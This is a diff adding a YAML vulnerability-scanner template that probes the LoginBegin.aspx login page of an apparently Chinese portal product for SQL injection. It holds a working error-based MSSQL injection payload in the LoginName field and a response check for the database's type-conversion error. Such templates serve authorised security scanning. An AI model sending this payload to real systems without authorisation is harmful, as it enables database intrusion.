@@ -1,0 +1,23 @@
+name: poc-yaml-jinhui-LoginBegin-sql
+transport: http
+
+
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /Portal/LoginBegin.aspx?ReturnUrl=%2f
+      headers:
+        User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)
+        Content-Type: application/x-www-form-urlencoded
+      body: 'Todo=Validate&LoginName=1%27+AND+5094+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%2898%29%2BCHAR%28112%29%2BCHAR%28120%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%285094%3D5094%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29+AND+%27JKJg%27%3D%27JKJg&Password=&CDomain=Local&FromUrl='
+    expression: response.status == 200 && response.body.bcontains(b'转换成数据类型 int 时失败')
+
+expression: r0() 
+
+detail:
+  author: Superhero
+  links:
+    - https://blog.csdn.net/m0_60571842/article/details/140790595
+
